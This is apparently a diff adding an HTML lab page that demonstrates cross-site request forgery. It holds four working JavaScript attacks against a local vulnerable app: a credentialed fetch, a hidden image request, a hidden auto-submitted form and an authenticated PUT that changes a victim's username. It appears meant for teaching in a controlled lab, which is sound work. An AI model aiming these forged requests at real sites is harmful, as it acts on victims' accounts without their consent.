@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demonstration</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="cyber-container">
+        <div class="cyber-header">
+            <h1 class="cyber-title">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                </svg>
+                CSRF ATTACK DEMONSTRATION SUITE
+            </h1>
+            <p class="subtitle">Explore Cross-Site Request Forgery vectors</p>
+        </div>
+
+        <div class="vulnerability-warning">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+            </svg>
+            <div class="warning-text">
+                <strong>EDUCATIONAL PURPOSE ONLY:</strong> These attacks demonstrate CSRF vulnerabilities in controlled environments. Pair this page with the vulnerable user management build and only test in lab environments you control.
+            </div>
+        </div>
+
+        <div class="attack-grid">
+            <!-- Attack 1 -->
+            <div class="attack-card">
+                <div class="attack-header">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                    </svg>
+                    <h3 class="attack-title">Attack 1: Fetch CSRF</h3>
+                </div>
+                <p class="attack-description">Uses JavaScript fetch() API to make cross-origin GET request with credentials</p>
+                <button class="btn-attack" onclick="executeFetchCSRF()">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                    </svg>
+                    Execute Fetch Attack
+                </button>
+                <div id="log1" class="log-container"></div>
+            </div>
+
+            <!-- Attack 2 -->
+            <div class="attack-card">
+                <div class="attack-header">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+                    </svg>
+                    <h3 class="attack-title">Attack 2: Image Tag CSRF</h3>
+                </div>
+                <p class="attack-description">Creates hidden image tag to trigger GET request automatically</p>
+                <button class="btn-attack" onclick="executeImageCSRF()">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+                    </svg>
+                    Execute Image Attack
+                </button>
+                <div id="log2" class="log-container"></div>
+            </div>
+
+            <!-- Attack 3 -->
+            <div class="attack-card">
+                <div class="attack-header">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                    </svg>
+                    <h3 class="attack-title">Attack 3: Form Submission</h3>
+                </div>
+                <p class="attack-description">Auto-submits hidden form via iframe to target endpoint</p>
+                <button class="btn-attack" onclick="executeFormCSRF()">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                    </svg>
+                    Execute Form Attack
+                </button>
+                <div id="log3" class="log-container"></div>
+            </div>
+
+            <!-- Attack 4 -->
+            <div class="attack-card">
+                <div class="attack-header">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                    <h3 class="attack-title">Attack 4: PUT Request CSRF</h3>
+                </div>
+                <p class="attack-description">Sends authenticated PUT request to change username to "TREVOR_"</p>
+                <button class="btn-attack" onclick="executePutCSRF()">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                    </svg>
+                    Execute PUT Attack
+                </button>
+                <div id="log4" class="log-container"></div>
+            </div>
+        </div>
+    </div>
+
+    <iframe name="csrf-frame"></iframe>
+
+    <script>
+        function logMessage(logId, message, type = 'info') {
+            const logBox = document.getElementById(logId);
+            logBox.classList.add('active');
+            
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${type}`;
+            logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${message}`;
+            logBox.appendChild(logEntry);
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        async function executeFetchCSRF() {
+            const logId = 'log1';
+            document.getElementById(logId).innerHTML = '';
+            logMessage(logId, 'Starting Fetch CSRF attack...', 'info');
+            
+            try {
+                const response = await fetch('http://localhost:3000/api/test', {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'include',
+                    headers: {
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                });
+                
+                const data = await response.json();
+                logMessage(logId, `SUCCESS: ${data.message}`, 'success');
+                logMessage(logId, `Response: ${data.csrf_demo}`, 'info');
+            } catch (error) {
+                logMessage(logId, `FAILED: ${error.message}`, 'error');
+            }
+        }
+
+        function executeImageCSRF() {
+            const logId = 'log2';
+            document.getElementById(logId).innerHTML = '';
+            logMessage(logId, 'Starting Image Tag CSRF attack...', 'info');
+            
+            const csrfImg = document.createElement('img');
+            csrfImg.style.display = 'none';
+            csrfImg.src = `http://localhost:3000/api/test?timestamp=${Date.now()}`;
+            
+            csrfImg.onload = function() {
+                logMessage(logId, 'SUCCESS: Request completed', 'success');
+            };
+            
+            csrfImg.onerror = function() {
+                logMessage(logId, 'Request sent (error expected for non-image)', 'info');
+            };
+            
+            document.body.appendChild(csrfImg);
+            logMessage(logId, 'Image tag created and request triggered', 'info');
+            
+            setTimeout(() => {
+                if (document.body.contains(csrfImg)) {
+                    document.body.removeChild(csrfImg);
+                }
+            }, 5000);
+        }
+
+        function executeFormCSRF() {
+            const logId = 'log3';
+            document.getElementById(logId).innerHTML = '';
+            logMessage(logId, 'Starting Form Submission CSRF attack...', 'info');
+            
+            const form = document.createElement('form');
+            form.action = 'http://localhost:3000/api/test';
+            form.method = 'GET';
+            form.target = 'csrf-frame';
+            form.style.display = 'none';
+            
+            const fields = [
+                { name: 'method', value: 'form_submission' },
+                { name: 'victim_id', value: 'user123' },
+                { name: 'timestamp', value: Date.now().toString() }
+            ];
+            
+            fields.forEach(field => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = field.name;
+                input.value = field.value;
+                form.appendChild(input);
+            });
+            
+            const iframe = document.querySelector('iframe[name="csrf-frame"]');
+            iframe.onload = function() {
+                logMessage(logId, 'SUCCESS: Form submitted and response received', 'success');
+            };
+            
+            document.body.appendChild(form);
+            logMessage(logId, 'Form created with hidden fields', 'info');
+            
+            setTimeout(() => {
+                form.submit();
+                logMessage(logId, 'Form submitted to target endpoint', 'info');
+                
+                setTimeout(() => {
+                    if (document.body.contains(form)) {
+                        document.body.removeChild(form);
+                    }
+                }, 3000);
+            }, 500);
+        }
+
+        async function executePutCSRF() {
+            const logId = 'log4';
+            document.getElementById(logId).innerHTML = '';
+            logMessage(logId, 'Starting Authenticated PUT CSRF attack...', 'info');
+            
+            try {
+                const response = await fetch('http://localhost:3000/api/auth/username-cookie', {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        username: 'TREVORR' 
+                    }),
+                    credentials: 'include'
+                });
+
+                const data = await response.json();
+                
+                if (response.ok) {
+                    logMessage(logId, 'SUCCESS: Username changed to "TREVORR"', 'success');
+                    logMessage(logId, `Server response: ${JSON.stringify(data)}`, 'info');
+                } else {
+                    logMessage(logId, `FAILED: ${data.error || response.statusText}`, 'error');
+                }
+            } catch (error) {
+                logMessage(logId, `ERROR: ${error.message}`, 'error');
+            }
+        }
+    </script>
+</body>
+</html>
